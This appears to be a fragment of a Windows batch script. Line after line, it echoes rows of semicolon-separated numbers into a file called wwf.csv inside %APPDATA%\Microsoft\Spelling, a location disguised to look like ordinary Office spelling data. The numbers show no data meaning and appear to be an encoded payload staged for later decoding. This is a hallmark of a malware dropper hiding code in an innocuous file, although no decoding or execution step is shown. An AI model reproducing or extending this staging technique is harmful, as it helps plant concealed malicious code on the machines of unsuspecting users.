>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(521.48;802.232;566.18;2911.694;26.900;158.534;33.6261;908.67;933.43;933.187;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6771.944;72.904;44.912;216.8325;750.128;776.38;342.72;0615.536;95.590;234.786;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(239.4610;866.222;853.157;902.58;6854.811;189.829;39.816;6.3224;417.238;818.33;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(891.155;1022.830;193.439;84.882;177.6009;806.61;837.161;818.97;6542.880;110.861;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(19.866;191.5196;870.71;940.18;811.253;2658.838;50.808;178.954;223.1893;381.200;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(840.35;901.102;1637.889;157.329;135.718;100.1676;62.61;445.175;389.143;5137.884;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(228.733;229.881;176.7511;902.99;880.120;684.5;3542.912;65.746;80.872;148.9684;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(876.165;820.171;879.160;3528.850;117.326;217.846;135.7222;619.117;434.47;650.168;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6404.48;110.860;91.840;37.0258;891.160;939.132;902.33;9888.914;235.530;79.901;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(154.1215;938.73;924.247;31.101;0121.811;137.311;125.900;105.1024;900.230;810.234;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(867.151;4105.906;49.541;255.414;197.5942;391.92;916.77;427.161;6621.916;250.647;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(158.363;46.0622;485.22;807.201;719.163;5428.953;48.830;7.822;48.1921;830.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(498.160;53.2;4124.71;2.72;10.597;14.7487;844.210;50.0;40.0;2161.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.748;13.66;9.4264;742.134;772.134;947.13;1083.71;1.311;5.30;48.7871;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(829.136;549.11;348.9;6330.76;3.685;4.56;19.5516;42.85;383.49;319.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8208.517;6.63;85.54;8.8370;719.10;787.97;815.104;9534.805;110.803;116.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.0115;649.16;448.14;76.3;4578.685;4.67;19.37;82.6680;801.100;809.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.100;2469.649;30.748;28.66;3.9474;385.4;510.19;721.77;6126.805;99.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.815;111.0522;802.116;632.67;811.114;8341.812;111.814;97.816;105.3065;811.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(649.50;348.48;9287.66;3.585;4.43;19.1129;741.77;805.99;814.111;3232.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.802;116.532;82.2934;811.111;816.32;567.101;2729.814;116.805;102.805;99.1025;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(697.116;801.32;365.117;6188.816;104.811;114.805;116.5621;821.32;550.48;649.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1630.348;30.423;13.749;49.7869;648.55;648.56;450.48;0363.753;57.648;57.390;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(23.2442;513.50;454.48;655.48;0941.356;50.349;48.757;48.3942;357.90;748.126;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(349.11;6909.648;9.36;3.485;4.3338;36.19;52.85;783.49;8930.519;48.417;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.53;85.2899;34.8;419.10;487.97;0980.815;104.805;110.803;116.3375;811.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(549.16;548.14;5272.36;3.685;4.37;19.7760;67.82;801.100;809.111;4788.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.749;30.348;28.4267;36.3;485.4;310.19;0316.421;77.805;99.814;111.8553;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.111;802.116;332.67;5433.811;114.812;111.814;97.5152;816.105;811.110;749.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6780.348;38.36;3.585;4.5418;53.19;731.77;805.99;6382.814;111.815;111.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.4876;432.67;811.100;801.32;0592.383;105.803;110.805;110.7052;803.32;380.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(565.32;4610.650;48.349;49.548;130.2795;62.34;548.13;46.9;0605.542;134.772;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(134.947;13.9861;31.1;51.5;30.3;6538.830;2.415;0.448;130.0619;72.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.130;72.1;2784.30;171.940;250.814;16.5098;528.46;873.216;810.170;6620.830;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(16.477;52.886;242.5016;882.88;633.159;666.27;2724.442;107.933;90.780;170.5616;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(884.6;756.26;54.73;2756.886;127.895;12.530;221.1788;755.107;898.18;916.11;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7445.940;56.894;153.76;176.6362;900.57;913.1;420.49;3761.566;211.837;13.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.3902;835.126;848.96;636.108;0667.875;158.673;156.933;104.6652;594.210;923.155;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.178;1236.410;44.895;175.917;169.3598;543.174;822.9;875.215;0768.850;89.902;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(96.426;5.2074;933.102;818.232;350.82;4446.538;18.447;231.871;8.5762;480.207;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(879.68;883.93;3059.916;196.546;3.817;171.5047;804.243;903.109;943.58;7431.492;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(161.522;244.770;186.2855;924.56;800.172;810.100;0386.553;120.866;160.599;15.6377;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(445.211;764.147;948.227;0184.922;7.513;213.392;121.9138;865.73;341.231;413.190;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8038.860;19.819;190.848;61.6426;939.251;927.43;790.16;9958.531;77.586;40.862;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(122.3299;814.224;718.58;883.73;5049.394;216.937;237.567;145.3153;831.217;823.178;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(823.134;6374.527;217.362;177.840;93.8479;932.137;479.132;426.242;5666.861;47.689;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(228.844;59.2697;745.174;551.88;897.183;3479.662;254.450;211.879;3.3547;661.177;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(878.175;846.56;5885.826;210.857;128.644;245.4553;478.86;845.33;553.37;6623.895;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(57.810;100.827;83.3751;886.156;415.173;725.35;9843.832;203.944;186.73;134.0292;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(841.247;795.240;908.82;9853.891;140.848;135.888;192.9172;533.116;337.95;724.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6090.882;204.639;40.356;37.0030;852.57;574.54;907.124;9503.877;146.874;28.635;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(167.9689;869.102;936.97;731.106;7368.925;40.373;157.395;136.6972;926.37;393.211;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(633.75;3456.762;82.896;181.787;63.2860;336.3;940.209;822.91;6406.547;213.535;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(227.812;93.2617;615.81;470.119;879.248;3224.60;225.888;172.42;130.3303;695.219;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(892.21;879.189;0460.327;212.385;75.931;57.7977;861.15;933.35;773.188;3999.324;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(184.768;124.669;228.6392;893.195;814.122;924.114;6554.931;36.923;191.570;153.5128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(897.239;894.28;387.219;8946.831;141.936;77.673;48.0940;867.171;842.223;936.91;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3496.859;175.952;221.876;102.8873;926.193;851.129;823.237;9782.914;237.775;231.773;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(41.4387;867.19;540.166;867.125;8158.803;128.930;138.398;120.7399;395.178;647.132;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(915.87;0951.856;92.891;119.540;40.3082;941.237;809.195;440.143;4562.444;143.364;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.679;193.9724;925.133;468.137;896.9;1407.776;197.912;165.767;47.1087;816.149;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(947.110;948.120;2653.732;88.544;19.493;96.9532;849.154;762.79;651.132;3524.918;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(176.836;23.922;158.5907;778.244;850.176;888.70;3674.860;108.852;210.924;214.2490;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(836.140;711.2;43.1;1651.60;1.863;130.31;237.4612;748.130;71.233;548.16;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5415.76;9.743;6.51;4.0941;51.130;555.21;71.4;4602.53;2.71;0.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(29.5920;66.3;385.29;314.4;0541.622;4.320;72.810;100.5322;929.80;75.211;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(830.170;5373.623;55.755;34.881;109.1326;868.202;817.2;849.48;8306.325;6.39;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.46;1.5717;64.1;830.55;320.2;4419.64;12.530;10.50;83.3427;50.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.98;50.67;7429.70;65.748;11.66;3.1593;785.29;715.4;44.3;3654.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.834;48.315;6.7848;53.85;529.19;61.1;1525.955;4.45;48.33;1.5115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.255;448.31;76.3;6180.485;29.435;4.424;48.1497;422.128;420.114;645.58;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2267.52;49.844;67.885;20.3632;55.78;925.234;867.199;6234.449;209.535;137.452;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.2103;790.6;43.85;329.31;1148.64;83.348;81.348;79.9059;860.77;860.75;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(834.73;8090.804;116.816;112.458;47.0019;647.99;814.108;746.109;1661.805;99.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.815;111.4923;802.116;546.99;811.109;6380.447;112.807;105.747;99.5104;814.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(747.112;814.111;0962.800;117.699;116.815;47.8361;577.105;799.82;811.111;8458.567;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.814;65.817;116.1965;450.48;649.49;795.50;4735.548;49.449;95.448;51.9772;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(395.50;350.46;499.114;9687.808;48.794;6.58;43.6967;76.1;55.5;57.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2613.51;4.382;48.780;48.5216;578.6;48.43;66.1;2411.65;5.57;48.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(134.1204;466.104;816.116;812.58;4206.547;47.819;119.819;46.1470;809.105;699.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.115;0271.811;102.816;46.499;111.2790;809.47;812.107;805.47;5335.499;101.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.815;47.3436;377.105;599.82;811.111;9350.467;101.814;65.817;116.2313;350.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(349.49;595.50;3793.648;49.349;95.648;51.2187;495.50;350.46;599.114;5374.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.829;159.56;3.5952;685.29;332.4;829.151;5807.448;129.848;48.829;145.7901;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.9;543.6;61.4;6084.41;130.755;46.73;48.1878;829.131;748.63;66.8;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6808.343;6.61;5.75;7.3644;62.1;322.51;804.116;3394.816;112.458;47.747;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(119.1845;819.119;546.109;805.99;2919.814;111.815;111.802;116.7040;546.99;811.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(547.112;9706.807;105.811;112.815;47.3080;800.111;799.115;647.112;1392.814;105.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.814;121.7846;699.112;815.46;804.116;1684.809;48.564;6.38;43.0336;66.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(65.5;77.2;3057.62;48.352;30.350;32.9483;429.0;376.0;801.0;2668.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.397;0.808;0.3605;495.0;812.0;811.0;5411.808;0.805;0.499;0.6522;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(821.0;595.0;815.0;4631.816;0.797;0.816;0.1321;801.0;809.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1514.810;0.816;0.346;32.1471;329.48;413.6;39.42;3135.834;72.834;247.713;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.1536;61.11;55.0;63.130;8169.32;1.70;103.942;134.9635;865.152;924.84;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(821.26;7758.646;211.916;116.803;34.9052;855.11;850.17;925.99;0974.846;153.766;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(150.825;210.7957;821.12;844.193;801.95;6757.446;44.462;248.895;114.9670;909.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(831.254;890.63;2605.932;10.902;59.891;71.6993;869.163;943.105;919.99;7380.891;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(34.453;165.851;93.8905;801.132;844.125;839.70;2512.380;85.916;12.846;124.5700;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(910.26;675.28;943.60;4390.666;139.382;208.876;253.4885;807.227;362.7;346.41;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8743.855;230.461;27.865;212.4423;881.29;819.148;357.226;6152.933;100.901;68.761;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(120.1383;822.35;943.19;825.166;0356.844;116.831;141.944;203.2828;638.2;470.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(894.138;5994.316;187.864;169.65;12.5466;855.237;804.250;804.46;4676.849;160.342;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.642;107.4102;488.73;399.31;79.105;7522.810;90.852;150.928;131.4841;944.192;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(843.243;770.43;7659.922;252.559;208.889;53.3053;939.110;737.174;929.175;4455.639;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(237.908;221.943;14.6853;875.153;640.151;852.77;0192.614;61.711;242.58;137.1543;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(914.31;895.50;424.226;5038.940;197.345;206.791;158.5292;880.73;657.10;898.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2494.894;198.873;174.929;178.4389;917.219;621.136;781.69;4628.488;56.450;113.439;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(26.6588;827.177;944.39;948.222;4937.744;58.432;105.852;178.8859;489.137;804.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.167;2133.883;116.895;64.55;6.1825;866.1;442.40;762.130;9301.363;19.577;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.311;192.5243;879.77;945.225;843.127;9665.728;111.521;125.469;167.0992;818.229;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(764.42;801.163;6396.895;93.782;98.834;195.3424;529.99;354.151;834.223;6912.918;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(243.948;242.422;161.2330;854.39;925.205;865.151;0098.908;238.393;99.565;227.3548;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(391.7;856.135;662.6;1585.819;6.909;6.877;117.4206;331.20;890.97;797.181;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6574.940;220.898;27.44;190.6304;923.65;899.14;540.238;1306.922;101.347;236.851;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(246.7292;861.92;850.216;50.214;4555.861;70.889;89.943;151.0076;865.9;675.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(716.153;2512.828;31.908;0.541;197.5264;877.155;865.63;369.119;5124.530;53.898;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(210.862;162.2295;859.122;822.34;950.72;5213.849;31.871;251.771;35.6815;828.245;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(858.248;891.107;0329.883;75.851;226.935;117.0199;820.26;936.234;455.153;3238.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(24.775;255.914;179.7659;535.104;817.230;875.250;4499.952;139.935;11.828;234.6727;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.59;875.252;748.237;4901.34;76.842;223.923;117.9012;809.99;845.61;909.157;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5467.386;78.379;191.828;87.8321;334.161;820.17;450.33;9857.822;239.765;10.877;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.5007;951.168;904.164;593.193;2816.861;136.855;87.813;86.6262;778.72;369.192;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(766.201;6587.855;118.591;10.828;72.9865;807.253;821.159;893.189;3824.809;109.806;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(201.782;115.2864;319.13;822.80;905.49;6011.830;40.885;48.830;40.6651;881.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(41.1;748.129;4572.849;48.826;49.411;48.6413;59.6;53.85;74.6;9797.719;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.385;83.549;19.5883;448.17;76.3;385.4;3928.48;19.610;87.797;115.4155;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.105;810.103;816.111;8264.810;49.416;48.614;6.3252;63.85;44.7;619.7;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8542.782;101.800;109.811;110.3182;800.49;430.48;428.6;6220.33;85.64;10.619;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(21.2450;477.105;599.114;811.115;6533.811;102.816;32.367;111.0041;814.112;811.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.116;2463.805;111.810;49.640;48.5831;338.6;53.85;54.3;6281.619;31.777;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.499;114.0408;811.115;811.102;816.32;1773.667;111.800;101.732;83.0441;805.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.105;810.103;1548.332;80.567;65.432;50.5357;348.49;349.2;719.51;8015.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.71;81.858;141.4049;843.64;813.163;414.65;1706.30;0.40;0.61;81.9978;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(648.9;66.5;443.14;8979.43;2.626;5.60;160.5484;829.237;348.25;66.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9022.742;134.372;134.947;13.9183;41.9;33.49;712.6;8305.310;43.36;1.44;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.8090;830.55;42.1;64.48;4885.728;6.410;43.56;1.7801;54.1;830.55;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.1;7295.311;49.414;48.312;6.1292;710.43;66.1;54.1;3948.830;55.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.421;48.3392;735.6;59.42;834.72;5806.834;247.313;1.59;4.1130;549.22;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.20;948.91;2324.934;90.934;171.398;192.5932;361.37;372.194;435.44;8266.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.899;24.352;161.2735;548.129;840.6;510.43;6791.46;1.44;1.830;55.9827;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.1;612.49;826.48;7958.824;160.794;128.592;0.8672;777.0;805.0;799.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9209.814;0.811;0.815;0.0066;811.0;802.0;816.0;7927.632;0.487;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4421;810.0;800.0;811.0;3939.819;0.815;0.732;0.6191;587.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;8404.807;0.802;0.808;0.0317;811.0;819.0;532.0;5645.670;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.2757;810.0;800.0;497.0;3696.816;0.805;0.811;0.4587;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.0;767.0;4137.811;0.809;0.812;0.6539;805.0;808.0;801.0;6150.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(161.526;128.624;104.7291;816.116;812.58;347.47;4487.819;119.819;46.809;105.9264;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(699.114;811.115;811.102;3437.816;46.699;111.809;48.3627;613.6;69.42;834.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7774.834;247.613;1.71;1.1727;45.0;54.130;71.0;8543.435;123.832;184.471;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(213.5758;327.58;819.151;852.168;1816.955;173.350;18.855;85.9396;887.252;942.145;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(829.39;4370.417;237.800;127.908;238.7274;902.76;594.39;856.197;0624.820;235.932;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(144.842;51.1727;883.66;856.128;532.38;5036.842;199.883;158.847;241.6486;937.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.148;582.114;3524.790;26.829;232.50;112.6607;649.55;677.132;34.215;2696.555;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(123.875;195.915;233.1486;676.151;832.57;477.191;7980.900;135.936;205.326;60.2099;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(679.28;886.250;900.148;4365.889;189.869;4.897;172.8927;332.247;913.64;544.159;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9975.929;7.52;206.888;192.8625;885.108;824.158;550.58;0175.865;214.939;50.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.8054;913.238;357.218;76.2;6454.901;240.664;118.868;38.8392;764.13;874.142;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(490.85;0417.685;191.750;144.323;143.0688;906.128;835.240;853.230;0965.817;76.394;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(178.932;156.6757;954.212;820.117;892.119;0786.819;155.879;57.892;232.7322;394.154;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(338.92;944.228;4693.940;125.394;152.899;38.8034;616.73;922.107;444.121;7927.928;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(185.828;132.833;208.3119;834.206;893.189;872.87;6906.882;182.834;94.949;86.6786;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(819.0;932.190;631.0;3244.808;122.437;158.941;37.4576;772.63;856.232;857.124;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7466.829;182.617;226.906;70.3022;938.226;925.39;363.106;9491.826;57.566;248.482;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(167.8767;450.237;483.169;853.160;1763.953;228.918;136.861;130.5938;338.8;748.130;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.36;2646.76;9.742;134.772;134.0951;947.13;31.9;76.49;4018.830;2.521;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.830;2.6690;417.2;51.1;548.129;4653.842;48.819;49.411;48.4568;59.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(53.85;74.6;5296.619;2.485;83.749;19.5581;748.17;46.3;485.4;2683.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(19.610;87.397;115.7274;804.105;810.103;816.111;8256.810;49.316;48.614;6.2426;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.85;74.7;619.7;0583.782;101.800;109.811;110.1685;800.49;530.48;428.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4404.33;85.64;10.619;21.3894;777.105;599.114;811.115;5178.811;102.816;32.767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.2511;814.112;811.114;497.116;7914.805;111.810;49.433;48.7972;731.6;73.85;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(54.3;9850.619;24.477;105.499;114.3684;811.115;811.102;816.32;6337.584;105.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.345;83.1429;816.97;809.112;532.80;1015.567;65.62;19.651;0.5202;60.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.82;48.216;0608.923;65.905;231.882;0.9806;40.0;70.1;32.48;4873.59;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.45;43.614;3.0906;52.26;55.0;860.93;9172.448;24.46;9.342;134.6190;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(472.134;947.13;31.9;9992.43;49.411;6.79;42.6986;834.72;834.247;313.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1300.47;1.648;28.56;9.3304;742.134;772.134;947.13;1391.61;9.55;49.715;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(23.9013;513.49;657.48;355.50;2727.353;48.650;52.655;50.9450;356.90;748.35;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.9;0442.542;134.572;134.947;13.8029;41.9;54.49;322.4;7132.520;42.569;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(192.473;144.0761;921.122;916.73;919.246;0955.342;27.941;182.590;16.9691;896.210;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(936.48;713.6;0654.49;42.834;72.834;247.7376;313.1;41.5;55.0;5035.34;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(130.61;0.874;123.8086;666.250;908.60;869.79;2228.882;167.906;255.817;113.8066;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(806.9;841.191;67.251;3195.842;85.832;132.815;98.6511;913.20;43.93;44.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6248.874;254.328;90.855;1.3547;378.186;877.237;630.176;7727.791;92.947;186.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(66.5402;32.254;807.69;856.71;6133.949;1.590;5.831;122.9228;891.191;898.136;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(835.0;0335.855;1.622;155.840;109.9627;898.72;69.58;889.130;2460.935;239.475;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(127.824;64.6607;905.52;579.1;689.141;3652.919;154.924;181.797;161.0196;888.137;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.165;843.68;3384.364;126.794;117.882;87.3963;809.216;825.5;849.13;6703.375;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(232.672;107.824;171.0420;766.190;680.9;676.237;5257.913;150.908;100.833;142.3242;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(589.232;945.20;772.93;8157.420;29.614;131.904;27.4077;928.7;892.224;852.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6611.699;135.483;211.907;103.6258;892.114;911.123;825.230;6739.823;180.885;71.753;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(241.9854;540.83;462.132;951.71;3956.45;75.419;51.796;204.9898;867.223;802.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(523.166;2350.767;82.668;108.915;22.9223;779.15;883.235;894.61;3939.840;6.937;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(255.893;25.0635;34.0;574.178;866.57;9103.834;127.44;99.580;248.0855;822.88;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(886.43;804.49;3577.729;245.771;254.922;253.3140;838.133;528.31;805.30;5054.934;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(93.805;137.884;122.0414;932.157;840.63;349.221;7310.875;231.63;220.926;192.6772;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(886.129;448.130;735.220;9869.36;10.643;6.61;4.8781;31.130;755.2;44.1;
